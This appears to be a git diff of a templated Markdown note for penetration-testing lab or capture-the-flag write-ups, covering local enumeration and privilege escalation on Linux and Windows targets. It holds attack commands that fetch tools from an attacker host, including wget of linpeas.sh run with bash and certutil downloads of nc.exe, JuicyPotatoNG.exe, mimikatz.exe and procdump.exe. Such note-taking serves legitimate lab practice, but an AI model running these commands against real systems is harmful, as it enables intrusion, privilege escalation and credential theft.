@@ -1,44 +1,59 @@
-# Shell
-#shell #flag #LocalEnumeration
+#PrivilegeEscalation #flag #LocalEnumeration
 
 ## Local Enumeration
-{% if os == "Linux"%}
-I ran the following commands to enumerate the system:
-```bash
-cd /tmp
-wget http://{{ kali_ip }}:8000/linpeas.sh
-bash linpeas.sh | tee enum.txt
-```
+{% if OS == "Linux" %}
 
 ### Linux
-#### Python pty 
+
+The `simplenum` script will automatically run a web server on the tools folder.
+It copy to clipboard the right commands to run on Linux by default or on Windows with the --windows option, the `linpeas.sh` script is used by default :
+
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-# ------
-stty raw -echo
-fg
-export SHELL=bash
-export TERM=xterm-256color
-reset
+simplenum
+[*] Linux command requested
+[**] Selecting default tool : linpeas.sh
+[*] Running web server http://192.168.119.136:80
+[**] http://192.168.119.136:80/linpeas.sh copied to clipboard !
+[+] Serving /home/yacine/Documents/tools...
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://192.168.243.152:80
+Press CTRL+C to quit
+```
+{% else %}
+
+The `simplenum` script will automatically run a web server on the tools folder.
+It copy to clipboard the right commands to run on Linux on Windows with the --windows option, the `winPEASx64.exe` file is used by default :
+
+```bash
+simplenum --windows
+[*] Windows command requested
+[**] Selecting default tool : winPEASx64.exe
+[*] Running web server http://192.168.119.136:80
+[**] http://192.168.119.136:80/winPEASx64.exe copied to clipboard !
+[+] Serving /home/yacine/Documents/tools...
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://192.168.243.152:80
+Press CTRL+C to quit
 ```
 
-{% else %}
+## Privilege Escalation
+
 ```bash
-impacket-smbserver share ~/Documents/tools/
-cd C:\Users\Public\Documents
-copy \\{{ kali_ip }}\share\winPEASx64.exe winPEASx64.exe
+cd C:\Users\Public
+certutil -urlcache -f http://$TUN_IP:80/nc.exe nc.exe
+certutil -urlcache -f http://$TUN_IP:80/JuicyPotatoNG.exe JuicyPotatoNG.exe
+certutil -urlcache -f http://$TUN_IP:80/mimikatz.exe mimikatz.exe
+certutil -urlcache -f http://$TUN_IP:80/procdump.exe procdump.exe
 ```
+
 {% endif %}
 
 
-# Privesc
-
-
-## Flag
+## Flag (Linux)
 ```bash
-cat proof.txt	
-XXX
+cat /root/proof.txt
 ```
-
-- Flag : XXX
